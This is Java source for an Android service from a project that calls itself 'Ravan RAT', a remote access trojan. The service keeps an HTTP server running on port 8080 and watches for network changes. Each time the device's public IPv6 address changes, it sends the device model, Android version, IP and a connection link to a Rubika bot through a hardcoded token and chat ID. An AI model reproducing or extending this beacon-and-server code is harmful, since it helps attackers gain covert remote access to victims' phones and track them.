package com.security.ravan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpServerService extends Service {

    private static final String TAG = "HttpServerService";
    private static final String CHANNEL_ID = "RavanServerChannel";
    private static final int NOTIFICATION_ID = 1;

    private RavanHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        checkAndReportIp();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if ("START".equals(action)) {
            startForeground(NOTIFICATION_ID, createNotification());
            startServer();
        } else if ("STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            stopSelf();
        }

        return START_STICKY;
    }

    private void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                server = new RavanHttpServer(this, 8080);
                server.start();
                Log.d(TAG, "HTTP Server started on port 8080");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server", e);
        }
    }

    private void stopServer() {
        try {
            if (server != null) {
                server.stop();
                server = null;
                Log.d(TAG, "HTTP Server stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping server", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Ravan RAT Server",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("HTTP Server running");

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        String ipv6 = MainActivity.getLocalIPv6Address();
        String contentText = ipv6 != null
                ? "Server running at http://[" + ipv6 + "]:8080"
                : "Server running on port 8080";

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🛡️ Ravan RAT Active")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        unregisterNetworkCallback();
        networkExecutor.shutdown();
        stopServer();
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                    super.onLinkPropertiesChanged(network, linkProperties);
                    checkAndReportIp();
                }
            };
            connectivityManager.registerDefaultNetworkCallback(networkCallback);
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void checkAndReportIp() {
        MainActivity.getPublicIPv6Async(currentIp -> {
            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
                networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                lastReportedIp = currentIp;
            }
        });
    }

    private void sendIpToWebhook(String ip) {
        try {
            String BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
            String CHAT_ID = "u0InoT70e0f6a7114f01edcc2236622b";
            
            String link = "http://[" + ip + "]:8080";
            
            String message = "✅ دستگاه جدید متصل شد!\n\n" +
                            "📱 دستگاه: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                            "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                            "🌐 IPv6: " + ip + "\n" +
                            "🔌 پورت: 8080\n" +
                            "🔗 لینک: " + link + "\n\n" +
                            "🕐 " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date());
            
            String escapedMessage = message.replace("\"", "\\\"").replace("\n", "\\n");
            
            String urlString = "https://botapi.rubika.ir/v3/" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            
            String jsonInputString = "{\"chat_id\": \"" + CHAT_ID + "\", \"text\": \"" + escapedMessage + "\"}";
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            int code = conn.getResponseCode();
            Log.d(TAG, "Rubika Bot Response Code: " + code);
            
            if (code == 200) {
                Log.d(TAG, "✅ پیام به روبیکا ارسال شد");
            } else {
                Log.e(TAG, "❌ خطا در ارسال به روبیکا: " + code);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send to Rubika: " + e.getMessage());
        }
    }
}
